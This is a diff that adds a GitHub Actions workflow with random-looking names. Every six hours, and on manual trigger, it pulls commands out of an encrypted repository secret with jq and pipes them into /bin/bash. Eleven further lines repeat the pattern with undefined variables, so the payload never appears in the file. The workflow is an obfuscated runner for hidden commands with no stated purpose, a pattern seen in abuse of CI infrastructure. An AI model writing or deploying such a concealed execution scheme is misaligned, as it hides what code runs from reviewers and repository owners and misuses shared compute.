@@ -1,0 +1,29 @@
+name: zhanghuanhui2109
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhanghuanhui2109
+        env:
+          o298: ${{ secrets.o298 }}
+        run: |
+          echo $o298 | jq -r .tojm260 | /bin/bash
+          echo $smy2250 | jq -r .hui9350 | /bin/bash
+          echo $dipj5 | jq -r .i29750 | /bin/bash
+          echo $pmvm3 | jq -r .kszt0317 | /bin/bash
+          echo $hinx15911 | jq -r .szjl52 | /bin/bash
+          echo $w966 | jq -r .m04 | /bin/bash
+          echo $m1970 | jq -r .ynrc300 | /bin/bash
+          echo $pczb9 | jq -r .da547 | /bin/bash
+          echo $eepy614 | jq -r .pk7 | /bin/bash
+          echo $wwdrj9749 | jq -r .r2 | /bin/bash
+          echo $gaq4 | jq -r .dsoxy4 | /bin/bash
+          echo $nknz83 | jq -r .yk6167 | /bin/bash
+
